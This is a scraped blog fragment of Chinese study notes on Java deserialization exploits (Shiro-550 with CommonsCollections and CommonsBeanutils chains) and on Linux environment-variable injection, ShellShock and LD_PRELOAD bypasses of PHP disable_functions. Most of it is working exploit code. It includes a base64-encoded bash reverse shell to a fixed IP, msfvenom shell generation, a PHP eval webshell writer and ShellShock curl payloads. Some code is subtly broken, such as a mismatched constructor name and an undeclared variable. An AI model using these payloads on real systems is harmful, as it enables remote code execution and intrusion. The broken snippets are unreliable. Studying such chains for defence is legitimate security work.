byte[][]{Base64.getDecoder().decode(\u0026#34;yv66vgAAADQAIQoABgASCQATABQIABUKABYAFwcAGAcAGQEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAaAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgEAClNvdXJjZUZpbGUBABdIZWxsb1RlbXBsYXRlc0ltcGwuamF2YQwADgAPBwAbDAAcAB0BABNIZWxsbyBUZW1wbGF0ZXNJbXBsBwAeDAAfACABABJIZWxsb1RlbXBsYXRlc0ltcGwBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAADAAEABwAIAAIACQAAABkAAAADAAAAAbEAAAABAAoAAAAGAAEAAAAIAAsAAAAEAAEADAABAAcADQACAAkAAAAZAAAABAAAAAGxAAAAAQAKAAAABgABAAAACgALAAAABAABAAwAAQAOAA8AAQAJAAAALQACAAEAAAANKrcAAbIAAhIDtgAEsQAAAAEACgAAAA4AAwAAAA0ABAAOAAwADwABABAAAAACABE=\u0026#34;)}); setFieldValue(obj, \u0026#34;_bytecodes\u0026#34;, new byte[][]{ ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode() }); setFieldValue(obj, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(obj, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(obj, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer[] fakeTransformers = new Transformer[] { new ConstantTransformer(1) }; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(TrAXFilter.class), new InstantiateTransformer( new Class[] { Templates.class }, new Object[] { obj } ) }; Transformer transformerChain = new ChainedTransformer(fakeTransformers); Map innerMap = new HashMap(); innerMap.put(\u0026#34;value\u0026#34;, \u0026#34;xxxx\u0026#34;); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); Class cls = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor construct = cls.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap); setFieldValue(transformerChain, \u0026#34;iTransformers\u0026#34;, transformers); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(handler); oos.close(); System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object) ois.readObject(); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } CCK1(Shiro-550) p牛给出了一个小demo，只有两个jsp，依赖有这些\nshiro-core、shiro-web，这是shiro本身的依赖 javax.servlet-api、jsp-api，这是JSP和Servlet的依赖，仅在编译阶段使用，因为Tomcat中自带这两个依赖 slf4j-api、slf4j-simple，这是为了显示shiro中的报错信息添加的依赖 commons-logging，这是shiro中用到的一个接口，不添加会爆java.lang.ClassNotFoundException: org.apache.commons.logging.LogFactory错误 commons-collections，为了演示反序列化漏洞，增加了commons-collections依赖，版本为3.2.1 打war包后部署在本地\n抓包可以看到，不勾选Remember Me时cookie有rememberMe=deleteMe，勾选的话则是\n这里的b64加密信息是AES，在org.apache.shiro.mgt.AbstractRememberMeManager中可以看到默认key\n可以看到它在同名的构造函数中设置了这个default key，而控制cookie信息org.apache.shiro.web.mgt.CookieRememberMeManager继承了这个类\n由于它使用了默认key并且用了cc依赖，我们的攻击过程是这样的：\n用CC链生成payload 用Shiro默认key进行加密 将密文作为rememberMe的Cookie发送给服务端 CC6为什么不行 p牛写了一个基于CC6的exp\npackage com.govuln.shiroattack; import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.util.ByteSource; public class Client0 { public static void main(String []args) throws Exception { byte[] payloads = new CommonsCollections6().getPayload(\u0026#34;whoami\u0026#34;); AesCipherService aes = new AesCipherService(); byte[] key = java.util.Base64.getDecoder().decode(\u0026#34;kPH+bIxk5D2deZiIxcaaaA==\u0026#34;); ByteSource ciphertext = aes.encrypt(payloads, key); System.out.printf(ciphertext.toString()); } } package com.govuln.shiroattack; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class CommonsCollections6 { public byte[] getPayload(String command) throws Exception { Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] { String.class, Class[].class }, new Object[] { \u0026#34;getRuntime\u0026#34;, new Class[0] }), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[] { String.class }, new String[] { command }), new ConstantTransformer(1), }; Transformer transformerChain = new ChainedTransformer(fakeTransformers); // 不再使用原CommonsCollections6中的HashSet，直接使用HashMap Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); TiedMapEntry tme = new TiedMapEntry(outerMap, \u0026#34;keykey\u0026#34;); Map expMap = new HashMap(); expMap.put(tme, \u0026#34;valuevalue\u0026#34;); outerMap.remove(\u0026#34;keykey\u0026#34;); Field f = ChainedTransformer.class.getDeclaredField(\u0026#34;iTransformers\u0026#34;); f.setAccessible(true); f.set(transformerChain, transformers); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(expMap); oos.close(); return barr.toByteArray(); } } 将生成结果发送，但是console疯狂报错\n看到这个org.apache.shiro.io.ClassResolvingObjectInputStream，它重写了resolveClass方法\npublic class ClassResolvingObjectInputStream extends ObjectInputStream { public ClassResolvingObjectInputStream(InputStream inputStream) throws IOException { super(inputStream); } protected Class\u0026lt;?\u0026gt; resolveClass(ObjectStreamClass osc) throws IOException, ClassNotFoundException { try { return ClassUtils.forName(osc.getName()); } catch (UnknownClassException var3) { throw new ClassNotFoundException(\u0026#34;Unable to load ObjectStreamClass [\u0026#34; + osc + \u0026#34;]: \u0026#34;, var3); } } } 这是反序列化中用来查找类的方法，它重写了ObjectInputStream\nprotected Class\u0026lt;?\u0026gt; resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException { String name = desc.getName(); try { return Class.forName(name, false, latestUserDefinedLoader()); } catch (ClassNotFoundException ex) { Class\u0026lt;?\u0026gt; cl = primClasses.get(name); if (cl != null) { return cl; } else { throw ex; } } } 注意到前者用的是org.apache.shiro.util.ClassUtils#forName（内部是org.apache.catalina.loader.ParallelwebappClassLoader#loadClass），而父类用的是Class.forName\n我们在上面的位置打断点调试一下；注意如果断不下来，可以考虑往前找一找调用关系，比如org.apache.shiro.mgt.AbstractRememberMeManager#decrypt，它执行cookie部分的解码，中间触发反序列化\nresolveClass依次得到我们链子中的LazyMap等等 都很正常，问题出在突然出现的[Lorg.apache.commons.collections.Transformer;\nclazz==null，抛出异常，但并不是因它是[L标记的数组这一点导致报错，因为在它后面还有fqcn=\u0026quot;[Ljava.lang.Object;\u0026quot;\n它就没有返回null，后面还有好几个都带[L标记的对象，都没有返回null，这样的猜测显然是错误的\n重新发包并继续断在loadClass\n我们注意到这里使用的ClassLoader是上面的ParallelWebappClassLoader，而它的工作模式就是这里的bug之处\njava装载类时遵循“全盘负责委托机制”，“全盘负责”指的是当一个ClassLoader装载一个类时，除非显示地使用另外一个ClassLoder，否则该类所依赖及引用的类也由这个ClassLoder载入；“委托机制”指先委托父类装载器寻找目标类，只有在找不到的情况下才从自己的类路径中查找并装载目标类，对应到这里，当它找不到时就会用上面的URLClassLoader\n（特别注意的是，WeappClassLoader默认不适用委托机制\n正常的class解析后path是最前面加/，.换为/，\n之后这个值会传入hashMap作为key，我们直接在key的地方断，发现Transformer数组传入稍有点特殊（数组都这样\n问题是它在前一步调用的是上层的URLClassLoader！\n对照其它带[L的对象\n被正常解析\n经过上面的调试我们可以得出结论：当反序列化流中出现非java自身的数组，会引起ParallelWebappClassLoader触发双亲委托机制，将对象交给上层的URLClassLoader进行处理，由于参数的不匹配，自然就出现无法加载类的错误\n搞个行的 既然问题出在非java原生的Transformer数组上，我们把它换为TiedMapEntry，构造函数接收两个参数 Map和Key，它有一个getValue方法\npublic Object getValue(){ return map.get(key); } 当我们出传入的map是LazyMap时，这个get就可以触发transform的回调了\npublic Object get(Object key){ if(map.containsKey(key) == false){ Object value = factory.transform(key); map.put(key, value); return value; } return map.get(key); } 前面用到get时我们并不关心传入的key，因为重点在Transformer数组的ConstantTransformer，我们通过它来初始化恶意对象\n而仔细看这里的key会被传入transform，它可以扮演ConstantTransformer的角色\n再回看Transformer数组\nTransformer[] transformers = new Transformer[]{ new ConstantTransformer(obj), new InvokerTransformer(\u0026#34;newTransformer\u0026#34;, null, null ) }; 第二行可以去掉，数组长度变为1，数组也不需要了\n编写一下exp\npackage ysoserial.payloads; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.Map; public class testCC6Shiro { public byte[] getPayload(byte[] clsBytes)throws Exception{ TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \u0026#34;_bytecodes\u0026#34;, new byte[][]{clsBytes}); setFieldValue(obj, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(obj, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(obj, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer transformer = new InvokerTransformer(\u0026#34;getClass\u0026#34;, null, null); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformer); TiedMapEntry tme = new TiedMapEntry(outerMap, obj); Map expMap = new HashMap(); expMap.put(tme, \u0026#34;valuevalue\u0026#34;); outerMap.clear();\t// 同outerMap.clear() setFieldValue(transformer, \u0026#34;iMethodName\u0026#34;, \u0026#34;newTransformer\u0026#34;); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(expMap); oos.close(); return barr.toByteArray(); }; public static void setFieldValue(Object obj, String fieldName, Object value)throws Exception{ Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); }; } 恶意类\npackage ysoserial.payloads; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; public class testCC6ShiroEvil { public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {} public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {} public Evil() throws Exception { super(); System.out.println(\u0026#34;Hello TemplatesImpl\u0026#34;); Runtime.getRuntime().exec(\u0026#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMuMTMxLzIyMjIgMD4mMQ==}|{base64,-d}|{bash,-i}\u0026#34;); } } 通过Client.java装配CC6Shiro\npackage ysoserial.payloads; import javassist.ClassPool; import javassist.CtClass; import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.util.ByteSource; public class testCC6ShiroClient { public static void main(String[] args) throws Exception{ ClassPool pool = ClassPool.getDefault(); CtClass cls = pool.get(ysoserial.payloads.testCC6ShiroEvil.class.getName()); byte[] payload = new testCC6Shiro().getPayload(cls.toBytecode()); AesCipherService aes = new AesCipherService(); byte[] key = java.util.Base64.getDecoder().decode(\u0026#34;kPH+bIxk5D2deZiIxcaaaA==\u0026#34;); ByteSource ciphertext = aes.encrypt(payloads, key); System.out.printf(ciphertext.toString()); } } 由于我在Linux上测试，就不弹计算器，直接弹shell\n效果拔群！！！！！！\n这一节我们将TemplatesImpl和CC6结合在一起，同时解决了CC3高版本利用不了的问题\nCC2 - cc4 CC反序列化利用链被提出时，cc依赖有以下两个版本，groupId和artifactId都不一样\ncommons-collections:commons-collections org.apache.commons:commons-collection4 表现在我们构造exp的区别是将decorate改为了LazyMap\npublic static Map decorate(Map map, Transformer factory){ return new LazyMap(map, factory); } public static \u0026lt;V, K\u0026gt; LazyMap\u0026lt;K, V\u0026gt; LazyMap(final Map\u0026lt;K, V\u0026gt; map, final Transformer\u0026lt;? super K, ? extends V\u0026gt; factory){ return new LazyMap\u0026lt;K, V\u0026gt;(map, factory); } 直接把gadget改一下名字即可；不过为了专门适配cc4，ysoserial也有专门的链子CC2和CC4\ncc包之所以能找出这么多链子，除了相当基础以外，更多的原因在于它包含了很多可以执行任意方法的Transformer，所以找链子的过程相当于找一条从Serializable#readObject到Transformer#transform方法的调用链\n我们分析一下CC2，它用到的关键类有java.util.PriorityQueue和org.apache.commons.collections4.comparators.TransformingComparator（可通过comprare调用transform）\njava.util.PriorityQueue重写了readObject方法\nprivate void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { // Read in size, and any hidden stuff s.defaultReadObject(); // Read in (and discard) array length s.readInt(); SharedSecrets.getJavaOISAccess().checkArray(s, Object[].class, size); queue = new Object[size]; // Read in all elements. for (int i = 0; i \u0026lt; size; i++) queue[i] = s.readObject(); // Elements are guaranteed to be in \u0026#34;proper order\u0026#34;, but the // spec has never explained what that might be. heapify(); } heapify-\u0026gt; siftDown-\u0026gt; siftDownUsingComparator-\u0026gt; comparator.compare-\u0026gt; TransformingComparator-\u0026gt; compare-\u0026gt; transform 构造poc\nimport java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.Comparator; import java.util.PriorityQueue; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.functors.ChainedTransformer; import org.apache.commons.collections4.functors.ConstantTransformer; import org.apache.commons.collections4.functors.InvokerTransformer; import org.apache.commons.collections4.comparators.TransformingComparator; public class CC2 { public static void main(String[] args) throws Exception{ Transformer[] fakeTransformers = new Transformer[]{new ConstantTransformer(1)}; Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[]{String.class, Class[].class}, new Object[]{\u0026#34;getRuntime\u0026#34;, new Class[0]} ), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[]{Object.class, Object.class}, new Object[]{null, new Object[0]} ), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new String[]{\u0026#34;calc.exe\u0026#34;} ), new ConstantTransformer(1), }; Transformer transformerChain = new ChainedTransformer(fakeTransformers); Comparator comparator = new TransformingComparator(transformerChain); PriorityQueue queue = new PriorityQueue(2, comparator); queue.add(1); queue.add(2); setFieldValue(transformerChain, \u0026#34;iTransformers\u0026#34;, transformers); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(queue); oos.close(); System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); } public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } } TemplatesImpl 把exp改造为TemplatesImpl的无transformer数组版\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections4.Transformer; import org.apache.commons.collections4.comparators.TransformingComparator; import org.apache.commons.collections4.functors.InvokerTransformer; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.Comparator; import java.util.PriorityQueue; public class CommonsCollections2TemplatesImpl { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } protected static byte[] getBytescode() throws Exception { ClassPool pool = ClassPool.getDefault(); CtClass clazz = pool.get(evil.EvilTemplatesImpl.class.getName()); return clazz.toBytecode(); } public static void main(String[] args) throws Exception { TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \u0026#34;_bytecodes\u0026#34;, new byte[][]{getBytescode()}); setFieldValue(obj, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(obj, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); Transformer transformer = new InvokerTransformer(\u0026#34;toString\u0026#34;, null, null); Comparator comparator = new TransformingComparator(transformer); PriorityQueue queue = new PriorityQueue(2, comparator); queue.add(obj); queue.add(obj); setFieldValue(transformer, \u0026#34;iMethodName\u0026#34;, \u0026#34;newTransformer\u0026#34;); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(queue); oos.close(); System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); } } 修复 这条CC2是cc4限定，因为org.apache.commons.collections4.comparators.TransformingComparator在之前版本是没有Serializable接口的，无法在序列化中使用\n在cc3.2.2版中通过添加FunctorUtils#checkUnsafeSerialization来检测反序列化是否安全，如果没有设置org.apache.commons.collections.enableUnsafeSerialization=true，会抛出异常\n这个检查在常见的危险Transformer类（Instantiate, Invoker, Prototype, CloneTransformer）里的readObject调用\n在cc4.1版中，这几个类没有Serializable接口，彻底无法序列化了\nCB1 Commons Beanutils，顾名思义封装了对java bean的一些操作方法，比如可以直接调用java bean的getter方法\nPropertyUtils.getProperty(new Cat(), \u0026#34;name\u0026#34;); 这里会自动找到name属性的方法，即getName，除此之外这个方法还支持递归获取属性\n在上面的CC2中我们使用了PriorityQueue，在它的排序中涉及到Comparator接口的compare方法，最后触发transform，在CB中也存在一个可利用的Comparator对象，BeanComparator\npublic int compare(T o1, T o2) { if (this.property == null) { return this.internalCompare(o1, o2); } else { try { Object value1 = PropertyUtils.getProperty(o1, this.property); Object value2 = PropertyUtils.getProperty(o2, this.property); return this.internalCompare(value1, value2); } catch (IllegalAccessException var5) { throw new RuntimeException(\u0026#34;IllegalAccessException: \u0026#34; + var5.toString()); } catch (InvocationTargetException var6) { throw new RuntimeException(\u0026#34;InvocationTargetException: \u0026#34; + var6.toString()); } catch (NoSuchMethodException var7) { throw new RuntimeException(\u0026#34;NoSuchMethodException: \u0026#34; + var7.toString()); } } } 传入两个对象，如果property为空则直接比较对象，否则用getProperty取出属性比较，调用对象的getter\n回想当时TemplatesImpl的调用链\nTemplateImpl#getOutputProperties\tpublic -\u0026gt; TemplateImpl#newTransformer\tpublic -\u0026gt; TemplateImpl#getTransletInstance -\u0026gt; TemplateImpl#defineTransletClasses -\u0026gt; TemplateImpl#defineClass\tdefault 注意到getOutputProperties，是触发后面的关键\npublic synchronized Properties getOutputProperties() { try { return newTransformer().getOutputProperties(); }catch (TransformerConfigurationException e) { return null; } } 它就是一个getter！跟前面的结合起来\nPropertyUtils.getProperty(o1, \u0026#34;outputProperties\u0026#34;); 当o1为TemplatesImpl对象时，就会调用getOutputProperties\n构造链子\nimport java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import javassist.ClassPool; import org.apache.commons.beanutils.BeanComparator; public class CommonsBeanutils1 { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public static void main(String[] args) throws Exception { TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \u0026#34;_bytecodes\u0026#34;, new byte[][]{ ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode() }); setFieldValue(obj, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(obj, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); final BeanComparator comparator = new BeanComparator(); final PriorityQueue\u0026lt;Object\u0026gt; queue = new PriorityQueue\u0026lt;Object\u0026gt;(2, comparator); // stub data for replacement later queue.add(1); queue.add(1); setFieldValue(comparator, \u0026#34;property\u0026#34;, \u0026#34;outputProperties\u0026#34;); setFieldValue(queue, \u0026#34;queue\u0026#34;, new Object[]{obj, obj}); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(queue); oos.close(); System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); } } Shiro-550(无cc shiro本身的依赖是有cb的，但是会因为serialVersionUID不符而报错，即使我们调对生成payload的本地依赖版本和目标环境一致也会出现cc依赖版本不对的情况，我们设想一条无依赖的Shiro反序列化利用链\n在BeanComparator的构造函数处，没有显式传入Comparator时默认使用cc中的ComparableComparator，替代类需要满足这样的条件：\n实现java.util.Comparator接口 实现java.io.Serializable接口 最好自带，兼容性强 我们找到了java.util.String中的内部私有类CaseInsesitiveComparator，它实现了Comparator和Serializable\n替换exp\nimport com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.beanutils.BeanComparator; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CommonsBeanutils1Shiro { public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception { Field field = obj.getClass().getDeclaredField(fieldName); field.setAccessible(true); field.set(obj, value); } public byte[] getPayload(byte[] clazzBytes) throws Exception { TemplatesImpl obj = new TemplatesImpl(); setFieldValue(obj, \u0026#34;_bytecodes\u0026#34;, new byte[][]{clazzBytes}); setFieldValue(obj, \u0026#34;_name\u0026#34;, \u0026#34;HelloTemplatesImpl\u0026#34;); setFieldValue(obj, \u0026#34;_tfactory\u0026#34;, new TransformerFactoryImpl()); final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER); final PriorityQueue\u0026lt;Object\u0026gt; queue = new PriorityQueue\u0026lt;Object\u0026gt;(2, comparator); // stub data for replacement later queue.add(\u0026#34;1\u0026#34;); queue.add(\u0026#34;1\u0026#34;); setFieldValue(comparator, \u0026#34;property\u0026#34;, \u0026#34;outputProperties\u0026#34;); setFieldValue(queue, \u0026#34;queue\u0026#34;, new Object[]{obj, obj}); // ================== // 生成序列化字符串 ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(queue); oos.close(); return barr.toByteArray(); } } ","date":"2022-03-23T18:40:31+08:00","permalink":"https://amiaaaz.github.io/2022/03/23/java-study-notes-03/","section":"posts","tags":["Java","unserialize"],"title":"Java学习笔记Ⅲ"},{"categories":["NOTES\u0026SUMMARY"],"contents":"普通环境变量 我是如何利用环境变量注入执行任意命令\nENV=\u0026#39;$(id 1\u0026gt;\u0026amp;2)\u0026#39; dash -i -c \u0026#39;echo hello\u0026#39; BASH_ENV=\u0026#39;$(id 1\u0026gt;\u0026amp;2)\u0026#39; bash -c \u0026#39;echo hello\u0026#39; ENV=\u0026#39;$(id 1\u0026gt;\u0026amp;2)\u0026#39; sh -i -c \u0026#34;echo hello\u0026#34; PROMPT_COMMAND=\u0026#39;id\u0026#39; bash\t# 执行命令后给出交互shell debian无 env $\u0026#39;BASH_FUNC_echo%%=() { id; }\u0026#39; bash -c \u0026#39;echo hello\u0026#39;\t# bash 4.4及以后 env $\u0026#39;BASH_FUNC_echo()=() { id; }\u0026#39; bash -c \u0026#34;echo hello\u0026#34;\t# bash 4.4以前 ShellShock / CVE-2014-6271 ShellShock漏洞回顾与分析测试 | 复现 - vulhub\n应用于bash 4.3及以前\n$ env TEST=\u0026#39;() { :; };\u0026#39; id; $ env x=\u0026#39;() { :;}; echo vulnerable\u0026#39; bash -c \u0026#34;echo this is a test \u0026#34; 对于vulhub的环境，还可以在UA头注入\n$ curl -H \u0026#39;User-Agent: () { foo; }; echo Content-Type: text/plain; echo; /usr/bin/id\u0026#39; http://127.0.0.1:8080/victim.cgi -i 对于当时的各大web服务来说影响相当广泛，只要是运行CGI相关服务的系统都存在被利用的可能（因为会在底层调用bash），比如\n运行CGI脚本（通过mod_cgi 和 mod_cgid）的Apache HTTP 服务器； 某些DHCP客户端； 使用Bash的各种网络服务； 使用ForceCommand功能的 OpenSSH 服务器； 使用CGI作为网络接口的基于Linux的路由器； 使用bash的各种嵌入式设备。 …… LD_PRELOAD #define _GNU_SOURCE #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; __attribute__ ((__constructor__)) void preload (void){ system(\u0026#34;ls / \u0026gt; /var/www/html/look\u0026#34;); // system(\u0026#34;bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/ip/port 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;); // system(\u0026#34;echo \\\u0026#34;\u0026lt;?php eval(\\\\$_POST[cmd]);?\u0026gt;\\\u0026#34; \u0026gt; /var/www/html/ame.php\u0026#34;); } $ gcc -fPIC -shared evil.c -o evil.so $ msfvenom -a x64 --platform Linux -p linux/x64/shell_reverse_tcp lhost=192.168.31.29 lport=8426 -f elf-so -o evil.so 加载恶意.so文件来劫持任意函数，常出现于bypass disable_functions和打redis中\n当web服务提供了自定义环境变量的接口，也可以用它来rce\nbypass disable_functions 浅谈几种Bypass disable_functions的方法\ngetuid #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; int geteuid() { const char* cmdline = getenv(\u0026#34;EVIL_CMDLINE\u0026#34;); if (getenv(\u0026#34;LD_PRELOAD\u0026#34;) == NULL) { return 0; } unsetenv(\u0026#34;LD_PRELOAD\u0026#34;); system(cmdline); } $ gcc -shared -fPIC test.c -o test.so \u0026lt;?php echo \u0026#34;\u0026lt;p\u0026gt; \u0026lt;b\u0026gt;example\u0026lt;/b\u0026gt;: http://test.com/exp.php?cmd=pwd\u0026amp;outpath=/tmp/xx\u0026amp;sopath=/var/www/html/exp.so \u0026lt;/p\u0026gt;\u0026#34;; $cmd = $_GET[\u0026#34;cmd\u0026#34;]; $out_path = $_GET[\u0026#34;outpath\u0026#34;]; $evil_cmdline = $cmd . \u0026#34; \u0026gt; \u0026#34; . $out_path . \u0026#34; 2\u0026gt;\u0026amp;1\u0026#34;; echo \u0026#34;\u0026lt;p\u0026gt; \u0026lt;b\u0026gt;cmdline\u0026lt;/b\u0026gt;: \u0026#34; . $evil_cmdline . \u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; putenv(\u0026#34;EVIL_CMDLINE=\u0026#34; . $evil_cmdline); $so_path = $_GET[\u0026#34;sopath\u0026#34;]; putenv(\u0026#34;LD_PRELOAD=\u0026#34; . $so_path); mail(\u0026#34;\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;\u0026#34;, \u0026#34;\u0026#34;); echo \u0026#34;\u0026lt;p\u0026gt; \u0026lt;b\u0026gt;output\u0026lt;/b\u0026gt;: \u0026lt;br /\u0026gt;\u0026#34; . nl2br(file_get_contents($out_path)) . \u0026#34;\u0026lt;/p\u0026gt;\u0026#34;; unlink($out_path); ?\u0026gt; url/test.php?cmd=pwd\u0026amp;outpath=/tmp/xx\u0026amp;sopath=/var/www/html/test.so 